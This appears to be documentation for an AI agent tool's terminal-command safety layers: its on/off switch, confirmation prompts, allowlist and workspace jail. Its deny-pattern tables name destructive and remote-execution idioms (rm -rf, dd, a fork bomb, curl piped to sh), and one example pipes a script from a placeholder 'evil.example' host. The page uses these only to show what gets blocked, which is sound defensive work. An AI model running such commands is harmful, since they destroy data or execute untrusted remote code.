# Terminal Command Security

Holix runs shell commands through the `run_terminal_command` tool. Before any command reaches the OS, it passes through **several independent checks**.

This page explains what is allowed, what is blocked, how the **whitelist** works, and how it relates to **user confirmation**.

---

## Protection layers (order of checks)

```mermaid
flowchart TD
  A[Agent calls run_terminal_command] --> B{Terminal tool enabled?}
  B -->|HOLIX_ENABLE_TERMINAL_TOOL=false| X1[Blocked: tool disabled]
  B -->|yes| C{ActionGuard confirmation}
  C -->|user denies| X2[Blocked: denied by user]
  C -->|approved / auto-allowed| D{Whitelist enabled?}
  D -->|HOLIX_TERMINAL_COMMAND_WHITELIST=false| F[Execute in shell]
  D -->|true default| E{Dangerous pattern?}
  E -->|yes| X3[Blocked: dangerous pattern]
  E -->|no| G{In whitelist?}
  G -->|no| X4[Blocked: not in whitelist]
  G -->|yes| H{Workspace jail?}
  H --> F
```

**Important:** In interactive TUI/Telegram, **confirmation** usually runs **before** the terminal tool body. Even an allowed whitelist command may still prompt `/yes` because terminal tools are classified as **HIGH** risk.

The whitelist is enforced **inside** `TerminalTool.execute()` — if confirmation passes but the command is not whitelisted, execution still fails with `Command blocked by safety policy`.

---

## 1. Enable / disable terminal tool

| Variable | Default | Effect |
|----------|---------|--------|
| `HOLIX_ENABLE_TERMINAL_TOOL` | `true` | Master switch for `run_terminal_command` |

When disabled, the agent receives:

```text
Error: Terminal tool is disabled (HOLIX_ENABLE_TERMINAL_TOOL=false)
```

Recommended in production if the agent does not need a shell.

---

## 2. Always forbidden patterns (dangerous commands)

Even if a command is whitelisted, **regex patterns** block destructive shell idioms first.

### Unix / macOS / Linux

| Pattern (examples) | Why blocked |
|--------------------|-------------|
| `rm -rf …` | Recursive forced delete |
| `> /dev/…` | Writing to device nodes |
| `dd …`, `mkfs`, `fdisk` | Disk destruction |
| `shutdown`, `reboot`, `killall` | System control |
| Fork bomb `:( ) { :|:& };:` | DoS |
| `curl … \| sh`, `wget … \| sh` | Remote code execution |

### Windows (additional)

| Pattern (examples) | Why blocked |
|--------------------|-------------|
| `format …`, `diskpart` | Disk operations |
| `del /f`, `del /q`, `rmdir /s` | Forced delete |
| `> nul`, `> con` | Suspicious redirection |

Example:

```text
curl https://evil.example/install.sh | bash
→ Blocked dangerous pattern: curl.*\|.*sh
```

These checks run **before** whitelist matching.

---

## 3. Command whitelist (allowlist)

Controlled by:

| Variable | Default | Effect |
|----------|---------|--------|
| `HOLIX_TERMINAL_COMMAND_WHITELIST` | `true` | Enforce allowlist |
| `HOLIX_TERMINAL_WHITELIST_EXTRA` | empty | Extra commands/prefixes (comma-separated) |

Per profile:

```bash
holix -p dev profile whitelist enable
holix -p dev profile whitelist add "docker, make"
holix -p dev profile whitelist list
```

See [PROFILES.md](PROFILES.md#terminal-whitelist-optional).

### How matching works

For each command string:

1. Lowercase + trim.
2. Check **dangerous patterns** (section 2).
3. Take the **first token** as `base_cmd` (e.g. `git` for `git status`).
4. Allow if `base_cmd` is in the allowlist **or** the full command **starts with** any allowlist entry.

Examples on Unix:

| Command | Result | Reason |
|---------|--------|--------|
| `ls -la` | Allowed | `ls` in defaults |
| `git status` | Allowed | prefix `git status` |
| `git push origin main` | **Blocked** | `git` alone not allowed; no matching prefix |
| `pip list` | Allowed | prefix `pip list` |
| `pip install requests` | **Blocked** | not `pip list` / `pip show` |
| `docker ps` | **Blocked** | until added via `whitelist add` |
| `holix gateway status` | Allowed | prefix `holix` |

Prefix design means `pytest tests/` is allowed because `pytest` is listed, but `make build` is **not** allowed until you add `make` or `make build` to extras — only `make test` is a default prefix.

### Built-in allowlist (Unix)

Read-only / diagnostic tools:

`ls`, `cat`, `head`, `tail`, `less`, `more`, `find`, `grep`, `awk`, `sed`, `pwd`, `whoami`, `date`, `uptime`, `hostname`, `df`, `du`, `free`, `ps`, `top`, `htop`, `ping`, `curl`, `wget`, `dig`, `nslookup`

Git (read-only subcommands only):

`git status`, `git log`, `git diff`, `git show`, `git branch`, `git remote`

Runtimes / tests:

`python`, `python3`, `node`, `pip list`, `pip show`, `pytest`, `npm test`, `make test`, `holix`, `uv`

### Built-in allowlist (Windows)

`dir`, `type`, `more`, `findstr`, `where`, `cd`, `echo`, `tree`, `whoami`, `hostname`, `date`, `systeminfo`, `tasklist`, `ipconfig`, `ping`, `curl`, `nslookup`, plus the same git/python/npm/pytest/holix/uv entries adapted for Windows (`py` instead of `python3` only).

Unix commands like `ls` or `grep` are **not** on the Windows list — use `dir` / `findstr`, or add extras.

### When whitelist is disabled

Setting `HOLIX_TERMINAL_COMMAND_WHITELIST=false` skips allowlist checks (dangerous patterns still apply). Use only in fully trusted dev environments.

---

## 4. User confirmation (ActionGuard)

After policy checks approve a tool call, interactive sessions may still ask:

| Command | Meaning |
|---------|---------|
| `/yes`, `/1` | Allow once |
| `/2` | Allow for session |
| `/3` | Allow always (stored) |
| `/no`, `/4` | Deny |

Terminal commands are **HIGH** risk by default. Patterns like `rm `, `mv `, `git push`, `pip install`, `docker run` escalate confirmation (even if you later add them to the whitelist).

During `/plan-auto`, plan-step tools may auto-approve per security policy.

Non-interactive API runs without confirmation deny high-risk tools unless pre-authorized.

---

## 5. Workspace jail (working directory)

If [workspace jail](PROFILES.md#workspace-jail-optional) is enabled, `run_terminal_command` runs with `cwd` set to the jail root. The whitelist does **not** replace jail — both apply.

---

## Allowed vs forbidden — practical guide

| Goal | Typical approach |
|------|------------------|
| Read project files | `read_file` tool or `cat` / `type` (whitelisted) |
| Run tests | `pytest`, `npm test`, `make test` |
| Check git state | `git status`, `git log`, `git diff` |
| Push / commit | Add `git` to extras **and** confirm, or run yourself outside Holix |
| Docker / make / custom CLI | `holix profile whitelist add "docker, make"` |
| Install packages | Not in default whitelist — manual install recommended |
| Delete files | `rm` not whitelisted; dangerous patterns block `rm -rf` |

---

## What the agent sees when blocked

**Not in whitelist:**

```text
Error: Command blocked by safety policy. Command 'docker' not in whitelist
```

**Dangerous pattern:**

```text
Error: Command blocked by safety policy. Blocked dangerous pattern: rm\s+-rf
```

**User denied confirmation:**

```text
Error: Tool call 'run_terminal_command' denied by user. Reason: Terminal command execution
```

---

## Production recommendations

1. Keep `HOLIX_TERMINAL_COMMAND_WHITELIST=true` (default).
2. Add only the **minimum** extras per profile (`whitelist add`).
3. Use **workspace jail** for shared/multi-user hosts.
4. Disable terminal entirely if not needed: `HOLIX_ENABLE_TERMINAL_TOOL=false`.
5. Disable Python executor if not needed: `HOLIX_ENABLE_CODE_EXECUTOR=false`.
6. Run `holix doctor` and review [SECURITY.md](SECURITY.md).

---

## Related docs

- [SECURITY.md](SECURITY.md) — auth, API keys, production checklist
- [PROFILES.md](PROFILES.md) — per-profile whitelist CLI
- [CONFIGURATION.md](CONFIGURATION.md) — environment variables
- [SLASH_COMMANDS.md](SLASH_COMMANDS.md) — `/yes`, `/1`–`/4` confirmations